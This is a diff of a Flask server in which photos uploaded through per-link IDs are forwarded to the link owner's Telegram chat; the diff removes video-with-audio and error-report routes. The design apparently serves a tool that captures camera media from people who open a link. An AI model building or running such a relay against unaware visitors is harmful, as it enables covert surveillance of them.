@@ -32,11 +32,11 @@ def image(unique_id):
 @app.route('/upload/<unique_id>', methods=['POST'])
 def upload_photo(unique_id):
     if unique_id not in link_data:
-        return {"status": "error", "reason": "link expired"}, 400
+        return {"status": "error"}, 400
     owner_id = link_data[unique_id]["owner"]
     data = request.get_json()
     if not data or 'image' not in data:
-        return {"status": "error", "reason": "no image"}, 400
+        return {"status": "error"}, 400
     image_b64 = data['image']
     if ',' in image_b64:
         image_b64 = image_b64.split(',')[1]
@@ -50,45 +50,7 @@ def upload_photo(unique_id):
         payload = {'chat_id': owner_id}
         resp = requests.post(url, files=files, data=payload)
     os.remove(temp_file)
-    if resp.status_code != 200:
-        logging.error(f"sendPhoto failed: {resp.text}")
-        return {"status": "error", "reason": "telegram send failed"}, 500
-    return {"status": "ok"}, 200
-
-@app.route('/upload_video/<unique_id>', methods=['POST'])
-def upload_video(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error", "reason": "link expired"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    if 'video' not in request.files:
-        return {"status": "error", "reason": "no video"}, 400
-    video_file = request.files['video']
-    temp_file = f"temp_video_{unique_id}.webm"
-    video_file.save(temp_file)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    with open(temp_file, 'rb') as vid:
-        files = {'video': vid}
-        payload = {'chat_id': owner_id, 'caption': '🎥 Video with Audio'}
-        resp = requests.post(url, files=files, data=payload)
-    os.remove(temp_file)
-    if resp.status_code != 200:
-        logging.error(f"sendVideo failed: {resp.text}")
-        return {"status": "error", "reason": "telegram send failed"}, 500
-    return {"status": "ok"}, 200
-
-# नया: एरर रिपोर्टिंग – जब JavaScript में कोई गड़बड़ हो तो बॉट ओनर को मैसेज भेजेगा
-@app.route('/error_report/<unique_id>', methods=['POST'])
-def error_report(unique_id):
-    if unique_id not in link_data:
-        return {"status": "error"}, 400
-    owner_id = link_data[unique_id]["owner"]
-    data = request.get_json()
-    if not data or 'message' not in data:
-        return {"status": "error"}, 400
-    msg = f"⚠️ Error from link {unique_id}:\n{data['message']}"
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  json={'chat_id': owner_id, 'text': msg})
-    return {"status": "ok"}, 200
+    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
 
 @app.route('/health')
 def health():
